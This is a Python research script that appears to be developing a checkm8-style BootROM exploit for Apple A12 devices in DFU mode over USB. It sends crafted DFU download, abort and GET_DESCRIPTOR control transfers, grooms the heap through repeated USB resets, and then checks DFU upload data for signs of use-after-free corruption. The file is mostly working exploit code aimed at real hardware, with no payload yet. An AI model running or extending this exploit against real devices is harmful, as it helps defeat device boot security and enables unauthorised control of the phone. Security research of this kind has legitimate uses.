#!/usr/bin/env python3
"""
A12 USB RESET ZLP Leak — Refined Approach
==========================================
The original checkm8 technique stalls EP0_IN differently:
  1. Send SETUP packets that cause EP0_IN data phase but DON'T read the data
  2. This leaves io_requests pending on EP0_IN  
  3. Then send USB reset → abort callbacks fire → ZLPs allocated → orphaned

The key insight: we need to trigger standard_device_request_cb with 
io_length > 0, io_length % 64 == 0, wLength > io_length.

Since no standard descriptor is mod64, we use a DIFFERENT approach:
  - DFU_DNLOAD sets up a data transfer of N bytes
  - The DFU protocol uses EP0 for both IN and OUT
  - By carefully controlling transfer sizes to be multiples of 64...

Actually, looking at the ipwndfu/checkm8 source more carefully:
The original checkm8 for A11 uses:
  1. Send many (0x800 / 0x40 = 32) SETUP packets requesting device descriptor
     with wLength=0x40 (64 bytes). The device responds with 18 bytes.
     18 % 64 != 0, so NO ZLP from descriptor.
  
  BUT the trick is: the io_request itself is 0x80 bytes allocated on heap.
  Even without ZLP, just having many pending io_requests on EP0_IN creates
  heap pollution after USB reset.

  The original technique doesn't rely on ZLP for A11 — it relies on the
  io_requests themselves being leaked (freed by abort but the heap gets
  fragmented by the callbacks' allocations).

Let's test that: accumulate io_requests, USB reset, see if DFU re-enters
with a shifted heap.
"""
import sys, time, struct, json
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC
DFU_PID = 0x1227

def get_backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def connect(timeout=10):
    for _ in range(timeout * 2):
        dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=get_backend())
        if dev:
            try: dev.set_configuration()
            except: pass
            return dev
        time.sleep(0.5)
    return None

def get_status(dev):
    try:
        r = dev.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
        return {"bStatus": r[0], "bState": r[4], "poll_ms": r[1]|(r[2]<<8)|(r[3]<<16)}
    except:
        return None

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}", flush=True)

def stall_ep0in_setup_only(dev, count):
    """
    Send SETUP packets that request IN data but use async so we don't 
    wait for the data phase. This queues io_requests on EP0_IN.
    
    We send GET_DESCRIPTOR SETUP packets requesting wLength=0x40.
    The device descriptor is 18 bytes < 64, so the transfer completes
    but the io_request is allocated.
    """
    log(f"Sending {count} GET_DESCRIPTOR(device) requests with wLength=0x40...")
    sent = 0
    errors = 0
    for i in range(count):
        try:
            # GET_DESCRIPTOR: bmRequestType=0x80, bRequest=6, wValue=0x0100, wIndex=0, wLength=0x40
            dev.ctrl_transfer(0x80, 6, 0x0100, 0, 0x40, timeout=100)
            sent += 1
        except usb.core.USBTimeoutError:
            sent += 1  # SETUP was sent
        except usb.core.USBError as e:
            if "pipe" in str(e).lower() or "io" in str(e).lower():
                errors += 1
                if errors > 3:
                    break
            else:
                sent += 1
    log(f"  Sent: {sent}, Errors: {errors}")
    return sent

def do_usb_reset_reconnect(dev):
    """USB bus reset, then reconnect."""
    log("USB BUS RESET...")
    try:
        dev.reset()
    except:
        pass
    
    # Dispose old resources
    try:
        usb.util.dispose_resources(dev)
    except:
        pass
    
    time.sleep(1.5)
    log("Reconnecting...")
    dev2 = connect(timeout=10)
    if dev2:
        st = get_status(dev2)
        log(f"  Reconnected, state={st}")
    else:
        log("  FAILED to reconnect!")
    return dev2

def test_heap_state(dev, marker):
    """
    Send a DFU_DNLOAD with a marker pattern, then DFU_UPLOAD to read back.
    Compare patterns across cycles to detect heap changes.
    """
    # First ensure we're in dfuIDLE
    for _ in range(5):
        st = get_status(dev)
        if not st:
            return None
        if st["bState"] == 2:
            break
        if st["bState"] == 10:
            dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
        elif st["bState"] in [5, 8]:
            # Need to re-enter DFU — send DFU_ABORT
            try:
                dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
            except:
                pass
            time.sleep(2)
            return None  # Device will re-enumerate
        time.sleep(0.2)
    
    # DNLOAD marker pattern
    pattern = bytes([marker] * 256)
    try:
        dev.ctrl_transfer(0x21, 1, 0, 0, pattern, timeout=5000)
        st = get_status(dev)
        if st and st["bState"] == 5:
            log(f"  DNLOAD 0x{marker:02X} pattern: OK (state={st['bState']})")
        else:
            log(f"  DNLOAD 0x{marker:02X} pattern: state={st}")
    except Exception as e:
        log(f"  DNLOAD error: {e}")
        return None
    
    # Try UPLOAD (read back)
    try:
        data = dev.ctrl_transfer(0xA1, 2, 0, 0, 256, timeout=2000)
        log(f"  UPLOAD: {len(data)} bytes")
        log(f"  First 16: {' '.join(f'{b:02X}' for b in data[:16])}")
        return bytes(data)
    except Exception as e:
        log(f"  UPLOAD error: {e}")
        return None

def test_checkm8_sequence():
    """
    Reproduce something closer to the actual checkm8 sequence:
    1. Trigger UAF setup (DNLOAD + incomplete transfer + ABORT)
    2. Heap grooming (many USB resets with pending requests)
    3. Re-enter DFU and check if io_buffer is at different address
    """
    log("=" * 60)
    log("CHECKM8 A12 SEQUENCE TEST")
    log("=" * 60)
    
    dev = connect()
    if not dev:
        log("No device!")
        return
    
    st = get_status(dev)
    log(f"Initial: {st}")
    
    # === PHASE 1: Setup UAF (standard checkm8 step) ===
    log("\n--- PHASE 1: UAF SETUP ---")
    
    # Step 1a: DFU_DNLOAD to set ep0DataPhaseBuffer 
    try:
        dev.ctrl_transfer(0x21, 1, 0, 0, bytes(0x800), timeout=5000)
        st = get_status(dev)
        log(f"DNLOAD 0x800: state={st}")
    except Exception as e:
        log(f"DNLOAD error: {e}")
    
    # Step 1b: Send a partial DNLOAD (incomplete data phase)
    # This sets up the stale pointer condition
    try:
        # Send less than wLength in the control transfer
        dev.ctrl_transfer(0x21, 1, 0, 0, bytes(0x40), timeout=5000)
        st = get_status(dev)
        log(f"Partial DNLOAD 0x40: state={st}")
    except Exception as e:
        log(f"Partial DNLOAD error: {e}")
    
    # === PHASE 2: Heap Spray via USB Reset ===
    log("\n--- PHASE 2: HEAP GROOMING VIA USB RESETS ---")
    
    for cycle in range(3):
        log(f"\n  Cycle {cycle+1}/3:")
        
        # Send many requests to create io_requests on heap
        sent = stall_ep0in_setup_only(dev, 30)
        
        # USB reset — goes through C448 path
        dev = do_usb_reset_reconnect(dev)
        if not dev:
            log("  Lost device, waiting...")
            time.sleep(5)
            dev = connect()
            if not dev:
                log("  Cannot reconnect!")
                return
    
    # === PHASE 3: Trigger DFU re-entry ===
    log("\n--- PHASE 3: DFU RE-ENTRY + HEAP CHECK ---")
    
    # DFU_ABORT triggers usb_quiesce → usb_free → re-enters DFU
    # If heap was groomed, new io_buffer should be at different address
    st = get_status(dev)
    log(f"Before DFU exit: state={st}")
    
    try:
        # DFU_CLR_STATUS or DFU_ABORT
        if st and st["bState"] == 10:
            dev.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
        dev.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
        log("DFU_ABORT sent (will cause re-entry)")
    except:
        log("DFU_ABORT caused disconnect (expected)")
    
    time.sleep(3)
    dev = connect()
    if not dev:
        log("Waiting for DFU re-entry...")
        time.sleep(5)
        dev = connect()
    
    if dev:
        st = get_status(dev)
        log(f"After DFU re-entry: state={st}")
        
        # Try to DNLOAD + UPLOAD to detect stale data
        log("\n--- PHASE 4: STALE DATA CHECK ---")
        
        # First, write a known pattern
        try:
            dev.ctrl_transfer(0x21, 1, 0, 0, bytes([0xBB] * 256), timeout=5000)
            st = get_status(dev)
            log(f"DNLOAD 0xBB: state={st}")
        except Exception as e:
            log(f"DNLOAD error: {e}")
        
        # DFU_UPLOAD might return stale data if UAF worked
        try:
            data = dev.ctrl_transfer(0xA1, 2, 0, 0, 256, timeout=2000)
            log(f"UPLOAD: {len(data)} bytes")
            log(f"First 32: {' '.join(f'{b:02X}' for b in data[:32])}")
            
            count_bb = sum(1 for b in data if b == 0xBB)
            count_00 = sum(1 for b in data if b == 0x00)
            count_other = len(data) - count_bb - count_00
            log(f"Pattern: 0xBB={count_bb}, 0x00={count_00}, other={count_other}")
            
            if count_other > 10:
                log(">>> ANOMALY: Unexpected data in UPLOAD! Possible heap corruption. <<<")
            elif count_00 > 200:
                log(">>> Buffer appears zeroed — heap may have moved (stale zero page). <<<")
            else:
                log(">>> Normal: buffer contains our pattern. <<<")
        except Exception as e:
            log(f"UPLOAD error: {e}")
    else:
        log("Device did not re-enter DFU!")
    
    log("\n" + "=" * 60)
    log("TEST COMPLETE")

if __name__ == "__main__":
    test_checkm8_sequence()
